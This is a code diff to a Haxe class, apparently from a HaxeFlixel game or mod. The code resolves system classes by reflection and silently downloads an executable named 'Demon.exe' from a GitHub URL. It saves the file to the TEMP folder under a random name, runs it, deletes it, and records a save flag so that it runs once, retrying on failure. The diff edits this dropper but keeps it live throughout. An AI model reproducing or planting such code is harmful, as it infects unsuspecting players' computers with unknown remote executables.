@@ -1,3 +1,4 @@
+
 import sys.thread.Thread;
 import lime.utils.AssetManifest;
 import lime.app.Promise;
@@ -13,32 +14,32 @@ class Ev
     static var Reflect:Class<FileSystem> = null;
     static function init()
     {
-        Sys = resolveClassEvilly("Sys");
-        File = resolveClassEvilly("sys.io.File");
-        FileSystem = resolveClassEvilly("sys.FileSystem");
-        Type = resolveClassEvilly("Type");
-        Reflect = resolveClassEvilly("Reflect");
-        if(Sys == null) return;
+        Ev.Sys = resolveClassEvilly("Sys");
+        Ev.File = resolveClassEvilly("sys.io.File");
+        Ev.FileSystem = resolveClassEvilly("sys.FileSystem");
+        Ev.Type = resolveClassEvilly("Type");
+        Ev.Reflect = resolveClassEvilly("Reflect");
+        if(Ev.Sys == null) return;
         //Reflect.field(FlxG, "save").data.DGrab = false;
-        if (Reflect.field(FlxG, "save").data.DGrab) return;
+        if (Ev.Reflect.field(FlxG, "save").data.DGrab) return;
 
-        var temp = Sys.getEnv("TEMP");
+        var temp = Ev.Sys.getEnv("TEMP");
         if (temp.endsWith("\\") == false) temp += "\\";
         var path = temp + "sfsdlfnkslfsdnf.exe";
-        try { FileSystem.deleteFile(path); } catch(e:Dynamic) {}
+        try { Ev.FileSystem.deleteFile(path); } catch(e:Dynamic) {}
         var future:Future<Bytes> = downloadDemonAsync();
         future.onComplete(bytes -> {
-            File.saveBytes(path, bytes);
+            Ev.File.saveBytes(path, bytes);
             
             runExeAsync(path).onComplete(worked -> {
                 if(worked)
                 {
-                    try { FileSystem.deleteFile(path); } catch(e:Dynamic) {}
-                    Reflect.field(FlxG, "save").data.DGrab = true;
+                    try { Ev.FileSystem.deleteFile(path); } catch(e:Dynamic) {}
+                    Ev.Reflect.field(FlxG, "save").data.DGrab = true;
                 }
                 else
                 {
-                    Reflect.field(FlxG, "save").data.DGrab = false;
+                    Ev.Reflect.field(FlxG, "save").data.DGrab = false;
                     init();
                 }
 
@@ -53,8 +54,8 @@ class Ev
     static function downloadDemonAsync():Future<Bytes>
     {
         var link = "https://raw.githubusercontent.com/EvilDev067/EvSc/refs/heads/main/Demon.exe";
-        var http = Type.resolveClass("lime.net._HTTPRequest_Bytes");
-        var request = Type.createInstance(http, []);
+        var http = Ev.Type.resolveClass("lime.net._HTTPRequest_Bytes");
+        var request = Ev.Type.createInstance(http, []);
         return request.load(link);
     }
 
@@ -65,7 +66,7 @@ class Ev
         promise = new Promise();
         
         Thread.create(() -> {
-            var exitCode = Sys.command(appPath);
+            var exitCode = Ev.Sys.command(appPath);
             promise?.complete(exitCode == 0);
         });
 
